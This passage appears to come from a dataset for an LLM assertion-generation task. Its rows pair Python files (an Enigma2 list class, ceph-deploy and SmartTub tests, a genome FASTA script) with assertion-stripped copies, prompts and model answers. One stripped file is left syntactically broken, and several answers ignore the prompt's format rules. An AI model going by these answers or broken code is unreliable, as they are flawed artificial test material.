117		self.setIndex(self.index)
118
119	def pageDown(self):
120		if self.getIndex() == self.count() - 1:
121			self.index = 0
122		elif self.getIndex() + 10 >= self.count():
123			self.index = self.count() - 1
124		else:
125			self.index += 10
126		self.setIndex(self.index)
127
128	def up(self):
129		self.selectPrevious()
130		
131	def down(self):
132		self.selectNext()
133
134	def getSelectedIndex(self):
135		return self.getIndex()","[['len(list)', '==', 'len(self.__list)']]",1,1,1.0,0.0002921413964358,"['list', 'enableWrapAround', 'item_height', 'fonts', 'if not list: list', 'if not fonts: fonts', 'self.__list', 'self.onSelectionChanged', 'self.item_height', 'self.fonts', 'self.disable_callbacks', 'self.enableWrapAround', 'self.__style', 'index', 'data', 'self.__list[index]', 'x.index', 'current', 'self.master.index', 'setCurrentIndex', 'self.index', 'style', 'old_index', 'self.list']",24,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['list', 'enableWrapAround', 'item_height', 'fonts', 'if not list: list', 'if not fonts: fonts', 'self.__list', 'self.onSelectionChanged', 'self.item_height', 'self.fonts', 'self.disable_callbacks', 'self.enableWrapAround', 'self.__style', 'index', 'data', 'self.__list[index]', 'x.index', 'current', 'self.master.index', 'setCurrentIndex', 'self.index', 'style', 'old_index', 'self.list']
*Code:

1from Source import Source
2from Components.Element import cached
3
4class List(Source, object):
5	""""""The datasource of a listbox. Currently, the format depends on the used converter. So
6if you put a simple string list in here, you need to use a StringList converter, if you are
7using a ""multi content list styled""-list, you need to use the StaticMultiList converter, and
8setup the ""fonts"".
9
10This has been done so another converter could convert the list to a different format, for example
11to generate HTML.""""""
12	def __init__(self, list=None, enableWrapAround=False, item_height=25, fonts=None):
13		if not list: list = []
14		if not fonts: fonts = []
15		Source.__init__(self)
16		self.__list = list
17		self.onSelectionChanged = [ ]
18		self.item_height = item_height
19		self.fonts = fonts
20		self.disable_callbacks = False
21		self.enableWrapAround = enableWrapAround
22		self.__style = ""default"" # style might be an optional string which can be used to define different visualisations in the skin
23
24	def setList(self, list):
25		self.__list = list
26		self.changed((self.CHANGED_ALL,))
27
28	list = property(lambda self: self.__list, setList)
29
30	def entry_changed(self, index):
31		if not self.disable_callbacks:
32			self.downstream_elements.entry_changed(index)
33
34	def modifyEntry(self, index, data):
35		self.__list[index] = data
36		self.entry_changed(index)
37
38	def count(self):
39		return len(self.__list)
40
41	def selectionChanged(self, index):
42		if self.disable_callbacks:
43			return
44
45		# update all non-master targets
46		for x in self.downstream_elements:
47			if x is not self.master:
48				x.index = index
49
50		for x in self.onSelectionChanged:
51			x()
52
53	@cached
54	def getCurrent(self):
55		return self.master is not None and self.master.current
56
57	current = property(getCurrent)
58
59	def setIndex(self, index):
60		if self.master is not None:
61			self.master.index = index
62			self.selectionChanged(index)
63
64	@cached
65	def getIndex(self):
66		if self.master is not None:
67			return self.master.index
68		else:
69			return None
70
71	setCurrentIndex = setIndex
72
73	index = property(getIndex, setIndex)
74
75	def selectNext(self):
76		if self.getIndex() + 1 >= self.count():
77			if self.enableWrapAround:
78				self.index = 0
79		else:
80			self.index += 1
81		self.setIndex(self.index)
82
83	def selectPrevious(self):
84		if self.getIndex() - 1 < 0:
85			if self.enableWrapAround:
86				self.index = self.count() - 1
87		else:
88			self.index -= 1
89		self.setIndex(self.index)
90
91	@cached
92	def getStyle(self):
93		return self.__style
94
95	def setStyle(self, style):
96		if self.__style != style:
97			self.__style = style
98			self.changed((self.CHANGED_SPECIFIC, ""style""))
99
100	style = property(getStyle, setStyle)
101
102	def updateList(self, list):
103		""""""Changes the list without changing the selection or emitting changed Events""""""
104		old_index = self.index
105		self.disable_callbacks = True
106		self.list = list
107		self.index = old_index
108		self.disable_callbacks = False
109
110	def pageUp(self):
111		if self.getIndex() == 0:
112			self.index = self.count() - 1
113		elif self.getIndex() - 10 < 0:
114			self.index = 0
115		else:
116			self.index -= 10
117		self.setIndex(self.index)
118
119	def pageDown(self):
120		if self.getIndex() == self.count() - 1:
121			self.index = 0
122		elif self.getIndex() + 10 >= self.count():
123			self.index = self.count() - 1
124		else:
125			self.index += 10
126		self.setIndex(self.index)
127
128	def up(self):
129		self.selectPrevious()
130		
131	def down(self):
132		self.selectNext()
133
134	def getSelectedIndex(self):
135		return self.getIndex()",5451,"[[12, 'list', '!=', None, ""Ensure that the list parameter is not null before initialization""],
[12, 'item_height', '>=', 0, ""Ensure item_height is a positive value""],
[12, 'fonts', '!=', None, ""Ensure that fonts parameter is not null before initialization""],
[24, 'list', '!=', None, ""Ensure that list is not null before setting""],
[34, 'index', '>=', 0, ""Ensure that the index is within range""],
[34, 'index', '<', 'self.count()', ""Ensure that the index is within range""],
[59, 'index', '>=', 0, ""Ensure that the index is within range""],
[59, 'index', '<', 'self.count()', ""Ensure that the index is valid""],
[75, 'self.count()', '!=', 0, ""Ensure there are more than 0 elements in the list for selection""],
[83, 'self.count()', '!=', 0, ""Ensure there are more than 0 elements in the list for selection""],
[95, 'style', '!=', None, ""Ensure the style is not null before setting""],
[102, 'list', '!=', None, ""Ensure that list is not null before updating""],
[110, 'self.count()', '!=', 0, ""Ensure there are more than 0 elements in the list to perform paging""],
[119, 'self.count()', '!=', 0, ""Ensure there are more than 0 elements in the list to perform paging""]]"
jumpstarter-io/ceph-deploy,"import argparse
import collections
import mock
import pytest
import subprocess

from ..cli import main
from .directory import directory


def test_help(tmpdir, cli):
    with cli(
        args=['ceph-deploy', 'mon', '--help'],
        stdout=subprocess.PIPE,
        ) as p:
        result = p.stdout.read()
    assert 'usage: ceph-deploy' in result
    assert 'positional arguments:' in result
    assert 'optional arguments:' in result


def test_bad_no_conf(tmpdir, cli):
    with pytest.raises(cli.Failed) as err:
        with cli(
            args=['ceph-deploy', 'mon'],
            stderr=subprocess.PIPE,
            ) as p:
            result = p.stderr.read()
    assert 'usage: ceph-deploy' in result
    assert 'too few arguments' in result
    assert err.value.status == 2


def test_bad_no_mon(tmpdir, cli):
    with tmpdir.join('ceph.conf').open('w'):
        pass
    with pytest.raises(cli.Failed) as err:
        with cli(
            args=['ceph-deploy', 'mon'],
            stderr=subprocess.PIPE,
            ) as p:
            result = p.stderr.read()
    assert 'usage: ceph-deploy mon' in result
    assert 'too few arguments' in result
    assert err.value.status == 2


from mock import Mock, patch


def make_fake_connection(platform_information=None):
    get_connection = Mock()
    get_connection.return_value = get_connection
    get_connection.remote_module.platform_information = Mock(
        return_value=platform_information)
    return get_connection


def test_simple(tmpdir, capsys):
    with tmpdir.join('ceph.conf').open('w') as f:
        f.write(""""""\
[global]
fsid = 6ede5564-3cf1-44b5-aa96-1c77b0c3e1d0
mon initial members = host1
"""""")

    ns = argparse.Namespace()
    ns.pushy = mock.Mock()
    conn = mock.NonCallableMock(name='PushyClient')
    ns.pushy.return_value = conn

    mock_compiled = collections.defaultdict(mock.Mock)
    conn.compile.side_effect = mock_compiled.__getitem__

    MON_SECRET = 'AQBWDj5QAP6LHhAAskVBnUkYHJ7eYREmKo5qKA=='

    def _create_mon(cluster, get_monitor_secret):
        secret = get_monitor_secret()
        assert secret == MON_SECRET

    fake_ip_addresses = lambda x: ['10.0.0.1']
    try:
        with patch('ceph_deploy.new.net.ip_addresses', fake_ip_addresses):
            with mock.patch('ceph_deploy.new.net.get_nonlocal_ip', lambda x: '10.0.0.1'):
                with mock.patch('ceph_deploy.new.arg_validators.Hostname', lambda: lambda x: x):
                    with mock.patch('ceph_deploy.new.hosts'):
                        with directory(str(tmpdir)):
                            main(
                                args=['-v', 'new', '--no-ssh-copykey', 'host1'],
                                namespace=ns,
                                )
                            main(
                                args=['-v', 'mon', 'create', 'host1'],
                                namespace=ns,
                                )
    except SystemExit as e:
        raise AssertionError('Unexpected exit: %s', e)
    out, err = capsys.readouterr()
    err = err.lower()
    assert 'creating new cluster named ceph' in err
    assert 'monitor host1 at 10.0.0.1' in err
    assert 'resolving host host1' in err
    assert ""monitor initial members are ['host1']"" in err
    assert ""monitor addrs are ['10.0.0.1']"" in err
","
1import argparse
2import collections
3import mock
4import pytest
5import subprocess
6
7from ..cli import main
8from .directory import directory
9
10
11def test_help(tmpdir, cli):
12    with cli(
13        args=['ceph-deploy', 'mon', '--help'],
14        stdout=subprocess.PIPE,
15        ) as p:
16        result = p.stdout.read()
17
18
19def test_bad_no_conf(tmpdir, cli):
20    with pytest.raises(cli.Failed) as err:
21        with cli(
22            args=['ceph-deploy', 'mon'],
23            stderr=subprocess.PIPE,
24            ) as p:
25            result = p.stderr.read()
26
27
28def test_bad_no_mon(tmpdir, cli):
29    with tmpdir.join('ceph.conf').open('w'):
30        pass
31    with pytest.raises(cli.Failed) as err:
32        with cli(
33            args=['ceph-deploy', 'mon'],
34            stderr=subprocess.PIPE,
35            ) as p:
36            result = p.stderr.read()
37
38
39from mock import Mock, patch
40
41
42def make_fake_connection(platform_information=None):
43    get_connection = Mock()
44    get_connection.return_value = get_connection
45    get_connection.remote_module.platform_information = Mock(
46        return_value=platform_information)
47    return get_connection
48
49
50def test_simple(tmpdir, capsys):
51    with tmpdir.join('ceph.conf').open('w') as f:
52        f.write(""""""\
53[global]
54fsid = 6ede5564-3cf1-44b5-aa96-1c77b0c3e1d0
55mon initial members = host1
56"""""")
57
58    ns = argparse.Namespace()
59    ns.pushy = mock.Mock()
60    conn = mock.NonCallableMock(name='PushyClient')
61    ns.pushy.return_value = conn
62
63    mock_compiled = collections.defaultdict(mock.Mock)
64    conn.compile.side_effect = mock_compiled.__getitem__
65
66    MON_SECRET = 'AQBWDj5QAP6LHhAAskVBnUkYHJ7eYREmKo5qKA=='
67
68    def _create_mon(cluster, get_monitor_secret):
69        secret = get_monitor_secret()
70
71    fake_ip_addresses = lambda x: ['10.0.0.1']
72    try:
73        with patch('ceph_deploy.new.net.ip_addresses', fake_ip_addresses):
74            with mock.patch('ceph_deploy.new.net.get_nonlocal_ip', lambda x: '10.0.0.1'):
75                with mock.patch('ceph_deploy.new.arg_validators.Hostname', lambda: lambda x: x):
76                    with mock.patch('ceph_deploy.new.hosts'):
77                        with directory(str(tmpdir)):
78                            main(
79                                args=['-v', 'new', '--no-ssh-copykey', 'host1'],
80                                namespace=ns,
81                                )
82                            main(
83                                args=['-v', 'mon', 'create', 'host1'],
84                                namespace=ns,
85                                )
86    except SystemExit as e:
87        raise AssertionError('Unexpected exit: %s', e)
88    out, err = capsys.readouterr()
89    err = err.lower()
90","[['err.value.status', '==', '2'], ['err.value.status', '==', '2'], ['secret', '==', 'MON_SECRET']]",15,3,0.2,0.0009022556390977,"['tmpdir', 'cli', 'result', 'platform_information', 'get_connection', 'get_connection.return_value', 'get_connection.remote_module.platform_information', 'capsys', 'fsid', 'mon initial members', 'ns', 'ns.pushy', 'conn', 'ns.pushy.return_value', 'mock_compiled', 'conn.compile.side_effect', 'MON_SECRET', 'cluster', 'get_monitor_secret', 'secret', 'fake_ip_addresses', 'out', 'err']",23,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['tmpdir', 'cli', 'result', 'platform_information', 'get_connection', 'get_connection.return_value', 'get_connection.remote_module.platform_information', 'capsys', 'fsid', 'mon initial members', 'ns', 'ns.pushy', 'conn', 'ns.pushy.return_value', 'mock_compiled', 'conn.compile.side_effect', 'MON_SECRET', 'cluster', 'get_monitor_secret', 'secret', 'fake_ip_addresses', 'out', 'err']
*Code:

1import argparse
2import collections
3import mock
4import pytest
5import subprocess
6
7from ..cli import main
8from .directory import directory
9
10
11def test_help(tmpdir, cli):
12    with cli(
13        args=['ceph-deploy', 'mon', '--help'],
14        stdout=subprocess.PIPE,
15        ) as p:
16        result = p.stdout.read()
17
18
19def test_bad_no_conf(tmpdir, cli):
20    with pytest.raises(cli.Failed) as err:
21        with cli(
22            args=['ceph-deploy', 'mon'],
23            stderr=subprocess.PIPE,
24            ) as p:
25            result = p.stderr.read()
26
27
28def test_bad_no_mon(tmpdir, cli):
29    with tmpdir.join('ceph.conf').open('w'):
30        pass
31    with pytest.raises(cli.Failed) as err:
32        with cli(
33            args=['ceph-deploy', 'mon'],
34            stderr=subprocess.PIPE,
35            ) as p:
36            result = p.stderr.read()
37
38
39from mock import Mock, patch
40
41
42def make_fake_connection(platform_information=None):
43    get_connection = Mock()
44    get_connection.return_value = get_connection
45    get_connection.remote_module.platform_information = Mock(
46        return_value=platform_information)
47    return get_connection
48
49
50def test_simple(tmpdir, capsys):
51    with tmpdir.join('ceph.conf').open('w') as f:
52        f.write(""""""\
53[global]
54fsid = 6ede5564-3cf1-44b5-aa96-1c77b0c3e1d0
55mon initial members = host1
56"""""")
57
58    ns = argparse.Namespace()
59    ns.pushy = mock.Mock()
60    conn = mock.NonCallableMock(name='PushyClient')
61    ns.pushy.return_value = conn
62
63    mock_compiled = collections.defaultdict(mock.Mock)
64    conn.compile.side_effect = mock_compiled.__getitem__
65
66    MON_SECRET = 'AQBWDj5QAP6LHhAAskVBnUkYHJ7eYREmKo5qKA=='
67
68    def _create_mon(cluster, get_monitor_secret):
69        secret = get_monitor_secret()
70
71    fake_ip_addresses = lambda x: ['10.0.0.1']
72    try:
73        with patch('ceph_deploy.new.net.ip_addresses', fake_ip_addresses):
74            with mock.patch('ceph_deploy.new.net.get_nonlocal_ip', lambda x: '10.0.0.1'):
75                with mock.patch('ceph_deploy.new.arg_validators.Hostname', lambda: lambda x: x):
76                    with mock.patch('ceph_deploy.new.hosts'):
77                        with directory(str(tmpdir)):
78                            main(
79                                args=['-v', 'new', '--no-ssh-copykey', 'host1'],
80                                namespace=ns,
81                                )
82                            main(
83                                args=['-v', 'mon', 'create', 'host1'],
84                                namespace=ns,
85                                )
86    except SystemExit as e:
87        raise AssertionError('Unexpected exit: %s', e)
88    out, err = capsys.readouterr()
89    err = err.lower()
90",4609,"[[11, 'tmpdir', '!=', None, 'tmpdir should not be None'],
[11, 'cli', '!=', None, 'cli should not be None'],
[16, 'result', '!=', None, 'result should not be empty'],
[19, 'tmpdir', '!=', None, 'tmpdir should not be None'],
[19, 'cli', '!=', None, 'cli should not be None'],
[25, 'result', '!=', None, 'result should not be empty'],
[28, 'tmpdir', '!=', None, 'tmpdir should not be None'],
[28, 'cli', '!=', None, 'cli should not be None'],
[36, 'result', '!=', None, 'result should not be empty'],
[42, 'platform_information', '!=', None, 'platform_information should not be None'],
[44, 'get_connection', '!=', None, 'get_connection should not be None'],
[50, 'tmpdir', '!=', None, 'tmpdir should not be None'],
[50, 'capsys', '!=', None, 'capsys should not be None'],
[58, 'ns', '!=', None, 'ns should not be None'],
[60, 'conn', '!=', None, 'conn should not be None'],
[70, 'secret', '!=', None, 'secret should not be None'],
[88, 'out', '!=', None, 'out should not be None'],
[89, 'err', '!=', None, 'err should not be None']]"
nkgilley/home-assistant,"""""""Test the SmartTub sensor platform.""""""

import pytest
import smarttub


@pytest.mark.parametrize(
    ""entity_suffix,expected_state"",
    [
        (""state"", ""normal""),
        (""flow_switch"", ""open""),
        (""ozone"", ""off""),
        (""uv"", ""off""),
        (""blowout_cycle"", ""inactive""),
        (""cleanup_cycle"", ""inactive""),
    ],
)
async def test_sensor(spa, setup_entry, hass, entity_suffix, expected_state):
    """"""Test simple sensors.""""""

    entity_id = f""sensor.{spa.brand}_{spa.model}_{entity_suffix}""
    state = hass.states.get(entity_id)
    assert state is not None
    assert state.state == expected_state


async def test_primary_filtration(spa, spa_state, setup_entry, hass):
    """"""Test the primary filtration cycle sensor.""""""

    entity_id = f""sensor.{spa.brand}_{spa.model}_primary_filtration_cycle""
    state = hass.states.get(entity_id)
    assert state is not None
    assert state.state == ""inactive""
    assert state.attributes[""duration""] == 4
    assert state.attributes[""cycle_last_updated""] is not None
    assert state.attributes[""mode""] == ""normal""
    assert state.attributes[""start_hour""] == 2

    await hass.services.async_call(
        ""smarttub"",
        ""set_primary_filtration"",
        {""entity_id"": entity_id, ""duration"": 8, ""start_hour"": 1},
        blocking=True,
    )
    spa_state.primary_filtration.set.assert_called_with(duration=8, start_hour=1)


async def test_secondary_filtration(spa, spa_state, setup_entry, hass):
    """"""Test the secondary filtration cycle sensor.""""""

    entity_id = f""sensor.{spa.brand}_{spa.model}_secondary_filtration_cycle""
    state = hass.states.get(entity_id)
    assert state is not None
    assert state.state == ""inactive""
    assert state.attributes[""cycle_last_updated""] is not None
    assert state.attributes[""mode""] == ""away""

    await hass.services.async_call(
        ""smarttub"",
        ""set_secondary_filtration"",
        {
            ""entity_id"": entity_id,
            ""mode"": ""frequent"",
        },
        blocking=True,
    )
    spa_state.secondary_filtration.set_mode.assert_called_with(
        mode=smarttub.SpaSecondaryFiltrationCycle.SecondaryFiltrationMode.FREQUENT
    )
","
1""""""Test the SmartTub sensor platform.""""""
2
3import pytest
4import smarttub
5
6
7@pytest.mark.parametrize(
8    ""entity_suffix,expected_state"",
9    [
10        (""state"", ""normal""),
11        (""flow_switch"", ""open""),
12        (""ozone"", ""off""),
13        (""uv"", ""off""),
14        (""blowout_cycle"", ""inactive""),
15        (""cleanup_cycle"", ""inactive""),
16    ],
17)
18async def test_sensor(spa, setup_entry, hass, entity_suffix, expected_state):
19    """"""Test simple sensors.""""""
20
21    entity_id = f""sensor.{spa.brand}_{spa.model}_{entity_suffix}""
22    state = hass.states.get(entity_id)
23
24
25async def test_primary_filtration(spa, spa_state, setup_entry, hass):
26    """"""Test the primary filtration cycle sensor.""""""
27
28    entity_id = f""sensor.{spa.brand}_{spa.model}_primary_filtration_cycle""
29    state = hass.states.get(entity_id)
30
31    await hass.services.async_call(
32        ""smarttub"",
33        ""set_primary_filtration"",
34        {""entity_id"": entity_id, ""duration"": 8, ""start_hour"": 1},
35        blocking=True,
36    )
37
38
39async def test_secondary_filtration(spa, spa_state, setup_entry, hass):
40    """"""Test the secondary filtration cycle sensor.""""""
41
42    entity_id = f""sensor.{spa.brand}_{spa.model}_secondary_filtration_cycle""
43    state = hass.states.get(entity_id)
44
45    await hass.services.async_call(
46        ""smarttub"",
47        ""set_secondary_filtration"",
48        {
49            ""entity_id"": entity_id,
50            ""mode"": ""frequent"",
51        },
52        blocking=True,
53    )
54        mode=smarttub.SpaSecondaryFiltrationCycle.SecondaryFiltrationMode.FREQUENT
55    )
56","[['state', '==', 'not None'], ['state.state', '==', 'expected_state'], ['state', '==', 'not None'], ['state.state', '==', '""inactive""'], ['state.attributes[""duration""]', '==', '4'], ['state.attributes[""cycle_last_updated""]', '==', 'not None'], ['state.attributes[""mode""]', '==', '""normal""'], ['state.attributes[""start_hour""]', '==', '2'], ['state', '==', 'not None'], ['state.state', '==', '""inactive""'], ['state.attributes[""cycle_last_updated""]', '==', 'not None'], ['state.attributes[""mode""]', '==', '""away""']]",14,12,0.8571428571428571,0.0054970224461749,"['spa', 'setup_entry', 'hass', 'entity_suffix', 'expected_state', 'entity_id', 'state', 'spa_state']",8,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['spa', 'setup_entry', 'hass', 'entity_suffix', 'expected_state', 'entity_id', 'state', 'spa_state']
*Code:

1""""""Test the SmartTub sensor platform.""""""
2
3import pytest
4import smarttub
5
6
7@pytest.mark.parametrize(
8    ""entity_suffix,expected_state"",
9    [
10        (""state"", ""normal""),
11        (""flow_switch"", ""open""),
12        (""ozone"", ""off""),
13        (""uv"", ""off""),
14        (""blowout_cycle"", ""inactive""),
15        (""cleanup_cycle"", ""inactive""),
16    ],
17)
18async def test_sensor(spa, setup_entry, hass, entity_suffix, expected_state):
19    """"""Test simple sensors.""""""
20
21    entity_id = f""sensor.{spa.brand}_{spa.model}_{entity_suffix}""
22    state = hass.states.get(entity_id)
23
24
25async def test_primary_filtration(spa, spa_state, setup_entry, hass):
26    """"""Test the primary filtration cycle sensor.""""""
27
28    entity_id = f""sensor.{spa.brand}_{spa.model}_primary_filtration_cycle""
29    state = hass.states.get(entity_id)
30
31    await hass.services.async_call(
32        ""smarttub"",
33        ""set_primary_filtration"",
34        {""entity_id"": entity_id, ""duration"": 8, ""start_hour"": 1},
35        blocking=True,
36    )
37
38
39async def test_secondary_filtration(spa, spa_state, setup_entry, hass):
40    """"""Test the secondary filtration cycle sensor.""""""
41
42    entity_id = f""sensor.{spa.brand}_{spa.model}_secondary_filtration_cycle""
43    state = hass.states.get(entity_id)
44
45    await hass.services.async_call(
46        ""smarttub"",
47        ""set_secondary_filtration"",
48        {
49            ""entity_id"": entity_id,
50            ""mode"": ""frequent"",
51        },
52        blocking=True,
53    )
54        mode=smarttub.SpaSecondaryFiltrationCycle.SecondaryFiltrationMode.FREQUENT
55    )
56",3109,"[[18, 'spa', '!=', None, ""spa object required for testing""],
 [18, 'setup_entry', '!=', None, ""setup_entry object required for testing""],
 [18, 'hass', '!=', None, ""hass object required for testing""],
 [18, 'entity_suffix', '!=', None, ""entity_suffix string required for testing""],
 [18, 'expected_state', '!=', None, ""expected_state string required for testing""],
 [22, 'entity_id', '!=', None, ""entity_id should be defined""],
 [22, 'state', '!=', None, ""state should be defined""],

 [25, 'spa', '!=', None, ""spa object required for testing""],
 [25, 'spa_state', '!=', None, ""spa_state object required for testing""],
 [25, 'setup_entry', '!=', None, ""setup_entry object required for testing""],
 [25, 'hass', '!=', None, ""hass object required for testing""],
 [29, 'entity_id', '!=', None, ""entity_id should be defined""],
 [29, 'state', '!=', None, ""state should be defined""],

 [39, 'spa', '!=', None, ""spa object required for testing""],
 [39, 'spa_state', '!=', None, ""spa_state object required for testing""],
 [39, 'setup_entry', '!=', None, ""setup_entry object required for testing""],
 [39, 'hass', '!=', None, ""hass object required for testing""],
 [43, 'entity_id', '!=', None, ""entity_id should be defined""],
 [43, 'state', '!=', None, ""state should be defined""]]"
tedmeeds/tcga_encoder,"

from utils.utils import *
from utils.definitions import *
import pandas as pd

version = 36

if version == 36:
  fasta_file = ""data/human_genome/assembly_36/gencode.v3c.pc_transcripts.fa""
  savedir = os.path.join( os.environ[""HOME""], ""data/human_genome/assembly_36_fasta_process"" )
  
if version == 37:
  fasta_file = ""data/human_genome/assembly_37/gencode.v19.pc_transcripts.fa""
  savedir = os.path.join( os.environ[""HOME""], ""data/human_genome/assembly_37_fasta_process"" )
  
if version == 38:
  fasta_file = ""data/human_genome/assembly_38/gencode.v25.transcripts.fa""
  savedir = os.path.join( os.environ[""HOME""], ""data/human_genome/assembly_38_fasta_process"" )
  
print ""opening fasta""
f = open( os.environ[""HOME""] + ""/"" + fasta_file, 'r')

hugo2fptr = {}

#nbr = 95310

#print ""processing nbr %d""%nbr
s = f.readline()
i=0
while len(s)>0:
  #s = f.readline()
  if np.mod(i,1000)==0:
    #print ""S:""
    print s
  # 
  
  if s[0] == "">"":
    ss =s.split(""|"")
    ensembl_transcript = ss[0][1:]
    ensembl_gene = ss[1]
    hugo_gene = ss[5]
    hugo_transcript = ss[4]
    length = int(ss[6])
  else:
    continue
    
  seq = f.readline()
  assert seq[0] != "">"", ""something wrong""
  
  if hugo2fptr.has_key( hugo_gene ) is False:
    dirname = os.path.join( savedir, hugo_gene )
    check_and_mkdir( dirname )
      
  hugo2fptr[ hugo_gene ] = open( dirname + ""/sequences.fa"", ""a"" )
  hugo2fptr[ hugo_gene ].write( s )
  hugo2fptr[ hugo_gene ].write( seq )
  hugo2fptr[ hugo_gene ].close()
  
  s = f.readline()
  i+=1

print ""closing file pointers""
for hugo_gene, fptr in hugo2fptr.iteritems():
  fptr.close()
  
print ""closing fasta""
f.close()
print ""done""","
1
2
3from utils.utils import *
4from utils.definitions import *
5import pandas as pd
6
7version = 36
8
9if version == 36:
10  fasta_file = ""data/human_genome/assembly_36/gencode.v3c.pc_transcripts.fa""
11  savedir = os.path.join( os.environ[""HOME""], ""data/human_genome/assembly_36_fasta_process"" )
12  
13if version == 37:
14  fasta_file = ""data/human_genome/assembly_37/gencode.v19.pc_transcripts.fa""
15  savedir = os.path.join( os.environ[""HOME""], ""data/human_genome/assembly_37_fasta_process"" )
16  
17if version == 38:
18  fasta_file = ""data/human_genome/assembly_38/gencode.v25.transcripts.fa""
19  savedir = os.path.join( os.environ[""HOME""], ""data/human_genome/assembly_38_fasta_process"" )
20  
21print ""opening fasta""
22f = open( os.environ[""HOME""] + ""/"" + fasta_file, 'r')
23
24hugo2fptr = {}
25
26#nbr = 95310
27
28#print ""processing nbr %d""%nbr
29s = f.readline()
30i=0
31while len(s)>0:
32  #s = f.readline()
33  if np.mod(i,1000)==0:
34    #print ""S:""
35    print s
36  # 
37  
38  if s[0] == "">"":
39    ss =s.split(""|"")
40    ensembl_transcript = ss[0][1:]
41    ensembl_gene = ss[1]
42    hugo_gene = ss[5]
43    hugo_transcript = ss[4]
44    length = int(ss[6])
45  else:
46    continue
47    
48  seq = f.readline()
49  
50  if hugo2fptr.has_key( hugo_gene ) is False:
51    dirname = os.path.join( savedir, hugo_gene )
52    check_and_mkdir( dirname )
53      
54  hugo2fptr[ hugo_gene ] = open( dirname + ""/sequences.fa"", ""a"" )
55  hugo2fptr[ hugo_gene ].write( s )
56  hugo2fptr[ hugo_gene ].write( seq )
57  hugo2fptr[ hugo_gene ].close()
58  
59  s = f.readline()
60  i+=1
61
62print ""closing file pointers""
63for hugo_gene, fptr in hugo2fptr.iteritems():
64  fptr.close()
65  
66print ""closing fasta""
67f.close()
68print ""done""","[['seq[0]', '!=', '"">""']]",1,1,1.0,0.0006016847172081,"['version', 'fasta_file', 'savedir', 'f', 'hugo2fptr', '#nbr', 's', '#s', 'ensembl_transcript', 'ensembl_gene', 'hugo_gene', 'hugo_transcript', 'length', 'seq', 'dirname', 'hugo2fptr[ hugo_gene ]']",16,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['version', 'fasta_file', 'savedir', 'f', 'hugo2fptr', '#nbr', 's', '#s', 'ensembl_transcript', 'ensembl_gene', 'hugo_gene', 'hugo_transcript', 'length', 'seq', 'dirname', 'hugo2fptr[ hugo_gene ]']
*Code:

1
2
3from utils.utils import *
4from utils.definitions import *
5import pandas as pd
6
7version = 36
8
9if version == 36:
10  fasta_file = ""data/human_genome/assembly_36/gencode.v3c.pc_transcripts.fa""
